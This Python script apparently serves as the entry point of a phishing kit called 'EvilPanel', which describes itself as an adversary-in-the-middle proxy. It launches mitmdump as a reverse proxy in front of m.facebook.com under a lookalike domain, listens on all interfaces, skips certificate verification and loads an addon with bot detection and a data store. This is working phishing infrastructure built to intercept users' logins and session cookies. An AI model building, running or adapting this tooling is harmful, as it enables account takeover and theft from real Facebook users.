#!/usr/bin/env python3
"""
EvilPanel Main Entry Point v3.0
Starts mitmproxy with the EvilPanel addon

Based on 2025 AiTM implementation research
"""
import subprocess
import os
import sys
import signal

# Configuration
DOMAIN = os.environ.get("EVILPANEL_DOMAIN", "frontnews.site")
DATA_DIR = os.environ.get("EVILPANEL_DATA", "/opt/evilpanel/data")
CERT_FILE = "/opt/evilpanel/certs/combined.pem"
# Use the main addon with bot detection (not v2)
ADDON_PATH = os.environ.get("EVILPANEL_ADDON", "/opt/evilpanel/core/mitmproxy_addon.py")
LISTEN_PORT = 8443
UPSTREAM_HOST = "m.facebook.com"


def signal_handler(signum, frame):
    """Handle shutdown signals gracefully"""
    print("\n[*] Received shutdown signal, cleaning up...")
    sys.exit(0)


def check_prerequisites():
    """Verify all prerequisites are met"""
    errors = []
    
    # Check cert file
    if not os.path.exists(CERT_FILE):
        errors.append(f"Certificate file not found: {CERT_FILE}")
    
    # Check addon file
    if not os.path.exists(ADDON_PATH):
        errors.append(f"Addon file not found: {ADDON_PATH}")
    
    # Check data directory
    if not os.path.exists(DATA_DIR):
        try:
            os.makedirs(DATA_DIR, exist_ok=True)
            print(f"[+] Created data directory: {DATA_DIR}")
        except Exception as e:
            errors.append(f"Cannot create data directory: {e}")
    
    if errors:
        print("[!] Prerequisites check failed:")
        for error in errors:
            print(f"    - {error}")
        sys.exit(1)
    
    print("[+] Prerequisites check passed")


def main():
    """Main entry point"""
    
    # Set up signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Check prerequisites
    check_prerequisites()
    
    # Set environment variables for addon
    os.environ["EVILPANEL_DOMAIN"] = DOMAIN
    os.environ["EVILPANEL_DATA"] = DATA_DIR
    os.environ["EVILPANEL_DEBUG"] = "true"
    
    # Determine mitmdump path
    venv_mitmdump = "/opt/evilpanel/venv/bin/mitmdump"
    system_mitmdump = "/usr/local/bin/mitmdump"
    local_venv_mitmdump = os.path.join(os.path.dirname(__file__), "venv/bin/mitmdump")
    
    if os.path.exists(venv_mitmdump):
        mitmdump_path = venv_mitmdump
    elif os.path.exists(local_venv_mitmdump):
        mitmdump_path = local_venv_mitmdump
    elif os.path.exists(system_mitmdump):
        mitmdump_path = system_mitmdump
    else:
        # Try to find in PATH
        mitmdump_path = "mitmdump"
    
    # Build mitmproxy command
    cmd = [
        mitmdump_path,
        "--mode", f"reverse:https://{UPSTREAM_HOST}/",
        "--listen-host", "0.0.0.0",
        "--listen-port", str(LISTEN_PORT),
        "--ssl-insecure",
        "--set", "upstream_cert=false",
        "--set", "connection_strategy=lazy",
        "--set", "stream_large_bodies=10m",
    ]
    
    # Add certificate if it exists
    if os.path.exists(CERT_FILE):
        cmd.extend(["--certs", f"*={CERT_FILE}"])
    
    # Add addon script
    cmd.extend(["-s", ADDON_PATH])
    
    print("=" * 60)
    print("  EvilPanel AiTM Proxy v3.0")
    print("=" * 60)
    print(f"  Domain:     {DOMAIN}")
    print(f"  Upstream:   {UPSTREAM_HOST}")
    print(f"  Listening:  0.0.0.0:{LISTEN_PORT}")
    print(f"  Data Dir:   {DATA_DIR}")
    print(f"  Addon:      {ADDON_PATH}")
    print(f"  mitmdump:   {mitmdump_path}")
    print("=" * 60)
    print()
    
    try:
        # Run mitmproxy
        subprocess.run(cmd, check=True)
    except FileNotFoundError:
        print(f"[!] mitmdump not found at: {mitmdump_path}")
        print("[!] Install with: pip install mitmproxy")
        sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"[!] mitmproxy exited with error: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
